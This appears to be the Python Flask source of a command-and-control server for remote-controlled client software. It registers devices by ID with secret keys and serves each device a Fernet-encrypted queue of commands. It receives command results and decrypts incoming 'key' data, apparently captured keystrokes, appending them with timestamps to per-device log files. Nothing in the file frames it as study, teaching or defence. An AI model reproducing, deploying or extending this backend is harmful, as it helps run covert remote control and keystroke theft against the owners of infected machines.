import flask
from cryptography.fernet import Fernet
import json
import base64, hashlib
import time


def gen_fernet_key(passcode: bytes) -> bytes:
  assert isinstance(passcode, bytes)
  hlib = hashlib.md5()
  hlib.update(passcode)
  return base64.urlsafe_b64encode(hlib.hexdigest().encode('latin-1'))

app=flask.Flask(__name__)
udids={"TESTING-DEVICE-ID":{"ip":"172.0.0.1","usk":"TESTING-SECRET-KEY","cmds":[]}}

@app.route("/rfl/<ucid>/<udid>/<data>")
def rfl(ucid,udid,data):
  usk=udids[udid]["usk"]
  udids[udid]["cmds"].pop(0)
  fern=Fernet(gen_fernet_key(usk.encode()))
  data=fern.decrypt(data.encode())
  return ":-"

@app.route("/cssh/<udid>")
def cssh(udid):
  usk=udids[udid]["usk"]
  cmds=udids[udid]["cmds"]
  fern=Fernet(gen_fernet_key(usk.encode()))
  return fern.encrypt(json.dumps({"cmds":cmds}).encode()).decode()

@app.route("/rkd/<udid>/<crypt>")
def rkd(udid,crypt):
  usk=udids[udid]["usk"]
  fern=Fernet(gen_fernet_key(usk.encode()))
  key=fern.decrypt(crypt.encode())
  open(udid,'a').write(f"{time.time()}:{key.decode()}\n")
  return ":-"

if __name__ == "__main__":
  app.run()